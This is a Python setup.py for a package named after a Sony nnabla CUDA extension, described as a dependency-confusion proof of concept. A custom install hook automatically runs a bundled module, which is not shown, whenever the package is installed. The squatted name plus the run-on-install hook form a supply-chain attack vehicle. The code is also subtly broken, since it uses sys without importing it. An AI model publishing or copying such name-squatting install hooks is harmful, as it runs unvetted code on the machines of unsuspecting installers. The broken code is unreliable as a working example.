from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        install.run(self)
        subprocess.run([sys.executable, "-m", "poc_nvk.my_module"])

setup(
    name="nnabla-ext-cuda101_nccl2_ubuntu16",
    version="0.0.2",
    author="Naveen Kumawat",
    author_email="naveenkumawat1995@gmail.com",
    description="DEPEndency C0nfusion P0C for SONY",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/nvk0x",
    packages=["poc_nvk"],
    cmdclass={'install': CustomInstall},
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)

